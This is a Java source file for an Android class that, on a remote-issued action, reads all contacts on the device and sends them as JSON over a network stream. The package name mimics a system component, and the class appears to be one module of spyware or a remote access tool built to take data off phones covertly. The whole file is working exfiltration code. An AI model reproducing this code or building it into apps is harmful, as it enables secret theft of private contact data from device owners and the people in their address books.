package com.android.sys.action;

import com.android.sys.service.SystemService;
import com.android.sys.session.NetworkSessionManager;
import com.android.sys.utils.DataPack;
import com.android.sys.utils.SystemUtil;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.InputStream;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.util.List;

public class UploadContactsAction implements NetworkSessionManager.ActionHandler {
    @Override
    public void handleAction(String actionName, InputStream inputStream, OutputStream outputStream) {
        List<String> contactList = SystemUtil.getAllContact(SystemService.getContext());
        if(contactList == null) {
            return;
        }
        JSONObject responseJsonObject = new JSONObject();
        try {
            JSONArray smsArray = new JSONArray();
            for(String contact: contactList) {
                smsArray.put(contact);
            }
            responseJsonObject.put(actionName, smsArray);
        } catch (JSONException e) {
        }
        byte[] responseData = null;
        try {
            responseData = responseJsonObject.toString().getBytes("UTF-8");
        } catch (UnsupportedEncodingException e) {
            responseData = responseJsonObject.toString().getBytes();
        }
        DataPack.sendDataPack(outputStream, responseData);
    }
}
